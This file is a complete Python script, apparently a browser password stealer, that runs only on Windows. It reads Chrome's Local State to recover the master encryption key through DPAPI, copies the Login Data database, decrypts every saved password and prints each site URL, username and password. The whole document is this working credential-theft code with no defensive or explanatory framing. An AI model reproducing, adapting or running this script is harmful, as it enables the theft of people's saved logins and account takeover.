import importlib
import sqlite3
import base64
import shutil
import json
import os

if os.name != "nt":
    exit()

win32crypt = importlib.import_module("win32crypt")
AES = importlib.import_module("Cryptodome.Cipher.AES")

class Main:
    def __init__(self):
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as file:
            localState = file.read()
            localState = json.loads(localState)

        MasterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        MasterKey = MasterKey[5:]
        MasterKey = win32crypt.CryptUnprotectData(MasterKey, None, None, None, 0)[1]
        self.MasterKey = MasterKey
    
    def decrypt(self, buffer, MasterKey):
        try:
            iv = buffer[3:15]
            Payload = buffer[15:]
            cipher = AES.new(MasterKey, AES.MODE_GCM, iv)
            Decrypt = cipher.decrypt(Payload)
            Decrypt = Decrypt[:-16].decode()
            return Decrypt
        except:
            return "Password decryption failed"

if __name__ == "__main__":
    try:
        PATH = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        Chrome = Main()

        shutil.copy2(PATH, "Loginvault.db")

        connect = sqlite3.connect("Loginvault.db")
        cursor = connect.cursor()

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")

            for _ in cursor.fetchall():
                URL = _[0]
                USERNAME = _[1]
                EncryptedPassword = _[2]
                DecryptedPassword = Chrome.decrypt(EncryptedPassword, Chrome.MasterKey)

                if len(USERNAME) > 0 and len(URL) > 0:
                    print(str({
                        "url": URL,
                        "username": USERNAME,
                        "password": DecryptedPassword
                    }))
        except Exception as e:
            print(e)   
        cursor.close()
        connect.close()

        os.remove("Loginvault.db")
    except Exception as e:
        print(e)
